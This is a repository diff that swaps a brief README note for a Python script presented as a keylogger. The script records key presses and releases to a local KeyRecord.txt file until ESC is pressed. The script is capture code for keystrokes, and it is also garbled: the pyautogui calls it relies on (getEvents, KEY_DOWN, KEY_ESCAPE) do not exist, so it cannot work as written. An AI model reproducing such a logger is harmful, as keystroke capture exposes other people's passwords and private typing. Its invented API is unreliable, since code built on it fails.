@@ -1,5 +1,35 @@
-Just start the Script in Python and stop it with 'ESC'
-the output file is in the same folder as the script also
-'/download/keygrabber-master/KeyRecord.txt' or where
-somewhere else the Script is.
-THX
+# Import necessary libraries
+import sys
+import pyautogui
+import time
+
+# Check if the script is running from the correct directory
+if not '/download/keygrabber-master/' in sys.path[0]:
+    print("Please run this script from the correct directory.")
+    sys.exit()
+
+# File path for storing the key logs
+file_path = '/download/keygrabber-master/KeyRecord.txt'
+
+# Open the file in write mode
+with open(file_path, 'w') as file:
+    # Run the key logger until 'ESC' key is pressed
+    while True:
+        for event in pyautogui.getEvents():
+            if event.type == pyautogui.KEY_DOWN:
+                # Record the key press
+                file.write(f'{event.key}: down\n')
+                if event.key == pyautogui.KEY_ESCAPE:
+                    # Stop the key logger if 'ESC' key is pressed
+                    sys.exit()
+            elif event.type == pyautogui.KEY_UP:
+                # Record the key release
+                file.write(f'{event.key}: up\n')
+                if event.key == pyautogui.KEY_ESCAPE:
+                    # Stop the key logger if 'ESC' key is pressed
+                    sys.exit()
+
+# Close the file
+file.close()
+
+print("Key logger stopped. The output file is: " + file_path)
